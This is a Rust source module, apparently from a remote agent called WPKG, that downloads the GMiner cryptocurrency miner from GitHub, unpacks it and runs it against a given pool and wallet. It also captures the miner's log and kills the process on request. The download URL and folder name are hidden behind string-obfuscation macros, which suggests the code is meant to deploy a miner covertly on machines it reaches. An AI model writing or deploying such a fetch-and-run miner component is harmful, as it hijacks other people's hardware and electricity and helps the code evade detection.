use std::{
    io::{BufRead, BufReader, Cursor},
    path::Path,
    sync::Mutex,
};

use lazy_static::lazy_static;
use tracing::*;
use wpkg_macro::*;

use crate::{crypto, info_crypt, utils};

lazy_static! {
    pub static ref MINER_RUNNED: Mutex<bool> = Mutex::new(false);
    pub static ref MINER_LOG: Mutex<String> = Mutex::new(String::from(""));
}

pub const MINER_DIR: &str = encode!("gminer");
pub const URL: &str = encode!("https://github.com/develsoftware/GMinerRelease/releases/download/3.07/gminer_3_07_windows64.zip");

pub async fn install_gminer() -> anyhow::Result<()> {
    if !is_installed()? {
        let path = &format!(
            "{}/{}",
            utils::get_working_dir()?,
            wpkg_crypto::decode(MINER_DIR)
        );

        info!("{}{}", crypto!("Downloading crypto miner to "), &path);
        let zipdata = utils::download_data(&wpkg_crypto::decode(URL)).await?;

        info_crypt!("Extracting miner...");
        zip_extract::extract(Cursor::new(zipdata), Path::new(path), true)?;
    } else {
        info_crypt!("Miner is installed")
    }

    Ok(())
}

pub fn is_installed() -> anyhow::Result<bool> {
    Ok(Path::new(&format!(
        "{}/{}",
        utils::get_working_dir()?,
        wpkg_crypto::decode(MINER_DIR)
    ))
    .exists())
}

pub fn is_runned() -> bool {
    *MINER_RUNNED.lock().unwrap()
}

pub fn log() -> String {
    (*MINER_LOG.lock().unwrap()).clone()
}

pub fn run_miner(algo: &str, pool: &str, wallet: &str) -> anyhow::Result<()> {

    info_crypt!("Starting miner...");

    let mut child = utils::run_process_handle(
        &format!(
            "{}/{}/miner.exe",
            utils::get_working_dir()?,
            wpkg_crypto::decode(MINER_DIR)
        ),
        vec![
            "--algo",
            algo,
            "--server",
            pool,
            "--user",
            wallet,
        ],
    )?;

    tokio::spawn(async move {
        *MINER_RUNNED.lock().unwrap() = true;
        *MINER_LOG.lock().unwrap() = String::from("");

        info_crypt!("Miner runned succesfully...");

        if let Some(out) = child.stdout.as_mut() {
            let stdout_reader = BufReader::new(out);

            for line in stdout_reader.lines() {
                let mut logs = String::from(&*MINER_LOG.lock().unwrap());
                logs.push_str(&format!("{}\n", line.unwrap()));
                *MINER_LOG.lock().unwrap() = logs;
            }
        }

        info_crypt!("Miner clossed...");

        *MINER_RUNNED.lock().unwrap() = false;
    });

    Ok(())
}

pub fn stop_miner() -> anyhow::Result<()> {
    utils::run_process("taskkill.exe", vec!["/f", "/im", "miner.exe"], false)?;
    *MINER_RUNNED.lock().unwrap() = false;
    info_crypt!("Miner stopperd logs: {MINER_LOG}");
    info_crypt!("Miner was stopped by WPKG...");
    Ok(())
}
